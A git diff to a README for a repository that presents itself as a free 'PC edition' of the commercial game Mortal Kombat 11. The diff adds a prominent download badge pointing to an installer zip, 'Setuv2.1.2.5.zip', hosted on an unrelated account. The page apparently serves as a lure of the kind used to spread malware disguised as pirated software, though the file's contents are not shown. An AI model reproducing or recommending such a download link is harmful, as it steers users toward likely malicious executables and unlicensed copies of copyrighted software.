@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/dave-chenops2000e0/mortal-kombat-11-pc-edition/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # mortal-kombat-11-pc-edition
 
 Mortal-kombat — Mortal Kombat 11 is a fighting game from NetherRealm Studios and Warner Bros. This is the PC edition, so it's the same game, but for your computer.
